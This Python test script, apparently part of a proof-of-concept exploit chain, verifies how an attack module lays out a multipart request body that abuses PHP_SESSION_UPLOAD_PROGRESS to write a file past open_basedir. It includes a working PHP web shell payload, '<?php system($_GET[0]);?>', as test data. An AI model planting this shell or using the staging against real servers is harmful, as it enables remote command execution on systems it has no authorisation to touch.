#!/usr/bin/env python3 -I
"""Verifier for basedir_write_stage.py (offline; no lab needed).

Asserts the stage body layout: nfield tiny prefix $_POST fields (d-preserving fragmentation),
the BIG carrier field, the PHP_SESSION_UPLOAD_PROGRESS=shell field, and the trailing $_FILES part.

    python3 -I poc/primitives/write/verify_basedir_write_stage.py
"""
from __future__ import annotations

import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.write import basedir_write_stage as stage  # noqa: E402

CAR = bytes(bytearray(1024))
SHELL = b"<?php system($_GET[0]);?>"


def check(name, cond):
    print(("  ok   " if cond else "  FAIL ") + name)
    return cond


def main():
    ok = True
    parts = stage.stage_parts(CAR, SHELL, nfield=4, flen=100, fsize=5000)
    ok &= check("4 tiny prefix fields P000.. (filler R*100, fn=None)",
                len(parts) == 4 + 3
                and all(p[0] == b"P%03d" % i and p[1] == b"R" * 100 and p[2] is None
                        for i, p in enumerate(parts[:4])))
    ok &= check("BIG carrier field (fn=None)",
                parts[4] == (b"BIG", CAR, None))
    ok &= check("PHP_SESSION_UPLOAD_PROGRESS = shell (fn=None)",
                parts[5] == (stage.PROGRESS_KEY, SHELL, None))
    ok &= check("trailing $_FILES part f / a.bin (filler Z*5000)",
                parts[6] == (b"f", b"Z" * 5000, b"a.bin"))
    # a 2-field, 50-byte-filler variant
    p2 = stage.stage_parts(CAR, SHELL, nfield=2, flen=50)
    ok &= check("nfield/flen honoured (2 prefix fields, filler R*50)",
                len(p2) == 2 + 3 and p2[1] == (b"P001", b"R" * 50, None))
    print("\n==== verify_basedir_write_stage: %s ====" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
